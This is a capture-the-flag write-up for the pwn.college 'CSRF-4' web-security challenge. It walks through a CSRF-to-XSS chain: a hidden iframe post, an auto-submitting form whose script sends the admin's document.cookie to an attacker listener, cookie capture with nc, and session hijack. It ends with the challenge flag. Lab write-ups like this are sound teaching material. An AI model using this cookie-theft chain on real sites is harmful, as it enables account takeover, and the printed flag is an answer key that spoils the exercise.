---
layout: page
title: "CSRF-4 Write-up — pwn.college"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Goal

Use a **CSRF (Cross-Site Request Forgery)** vulnerability to trick the admin into executing an XSS payload by embedding a malicious iframe in your post. The iframe hosts an HTML file that auto-submits a form with the payload.

---

## 🛠️ Step-by-Step Exploitation

### 1. Create a post with an iframe to your server

```bash
PAYLOAD="content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&publish=on"
LENGTH=$(echo -n "$PAYLOAD" | wc -c)

echo -e "POST /draft HTTP/1.0\r
Host: challenge.localhost\r
Cookie: auth=hacker|1337\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: $LENGTH\r
\r
$PAYLOAD" | nc challenge.localhost 80
```
This publishes a post with a hidden <iframe> pointing to your server on port 1337.

### 2. Create a malicious index.html payload
```bash
<!-- index.html -->
<html>
  <body>
    <form action="http://challenge.localhost/ephemeral" method="GET" id="csrfForm">
      <input type="hidden" name="msg" value="<script>fetch('http://hacker.localhost:1338/?c='+document.cookie)</script>">
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```
Save this to index.html in the same directory where you will run your HTTP server.


### 3. Start the malicious server
```bash
python3 -m http.server 1337
```
This will serve your malicious index.html page to the admin when they visit your iframe.

### 4. Trigger the admin to visit the post
```
/challenge/victim
```
Output:
```bash
Visiting http://challenge.localhost:80/
Logging in as admin...
Visited the attacker's website (http://hacker.localhost:1337/)...
Visited! Go check if the attack worked!
```
### 5. Capture the stolen cookie
In another terminal:
``` 
nc -lvnp 1338
```
Output:
```bash
GET /?c=auth=admin|.QX5kzMzwSM0IzMyEzW} HTTP/1.1
```
You have successfully stolen the admin's session cookie.

### 6. Use the stolen admin cookie
```bash
printf "GET / HTTP/1.0\r\nHost:challenge.localhost\r\nCookie: auth=admin|.QX5kzMzwSM0IzMyEzW}\r\n\r\n" | nc challenge.localhost 80
```
This returns:
```bash
<h2>Author: admin</h2><b>YOUR POST:</b> pwn.college{csAoPfax0C99uPTOPNas95n4QSq.QX5kzMzwSM0IzMyEzW}
```

---

## Flag
```bash
pwn.college{csAoPfax0C99uPTOPNas95n4QSq.QX5kzMzwSM0IzMyEzW}
```
---
